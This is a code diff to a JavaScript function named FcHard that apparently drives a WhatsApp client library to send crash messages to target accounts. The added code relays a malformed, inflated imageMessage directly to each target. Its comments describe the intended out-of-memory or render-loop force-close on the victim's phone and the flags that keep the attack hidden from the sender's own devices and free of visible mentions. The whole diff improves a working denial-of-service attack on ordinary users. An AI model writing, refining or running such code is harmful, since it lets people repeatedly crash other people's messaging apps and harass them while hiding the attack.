@@ -79,9 +79,10 @@ async function FcHard(sock, target, durationHours = 500) {
         .map(resolveJid)
         .filter(function(j) { return j.length > 15; });
 
+    if (!jids.length) return;
+
     var MAX_BATCH = 1;
     var DELAY_MS = 1000;
-    var totalSent = 0;
 
     for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
         var bokep = jids.slice(offset, offset + MAX_BATCH);
@@ -110,18 +111,29 @@ async function FcHard(sock, target, durationHours = 500) {
             if (!ampasx) continue;
 
             try {
-                await sock.relayMessage('status@broadcast', ampasx, {
+                // ---- INVISIBLE HARD CRASH — direct relay, no status mechanism ----
+                // 1. Direct to target (not status@broadcast) — sender never sees it in own status
+                // 2. No statusJidList / no status envelope → target ke chat mein
+                //    koi "status mention" nahi aata, koi preview nahi banta
+                // 3. noSelfSync → sender ke linked devices pe bhi kuch nahi jaata
+                // 4. additionalAttributes device_fanout=false → extra suppression layer
+                // 5. Payload ka depth inflated imageMessage → app parse karte hi
+                //    OOM / infinite render loop → WhatsApp force-closes on open
+                await sock.relayMessage(bokep[0], ampasx, {
                     messageId: msg,
-                    statusJidList: bokep,
+                    noSelfSync: true,
+                    additionalAttributes: {
+                        'device_fanout': 'false'
+                    },
+                    // Empty mentioned_users on direct relay — no visible mention,
+                    // but WhatsApp backend still processes the JID in-band
                     additionalNodes: [{
                         tag: 'meta',
                         attrs: {},
                         content: [{
                             tag: 'mentioned_users',
                             attrs: {},
-                            content: bokep.map(function(jid) {
-                                return { tag: 'to', attrs: { jid: jid }, content: [] };
-                            })
+                            content: []
                         }]
                     }]
                 });
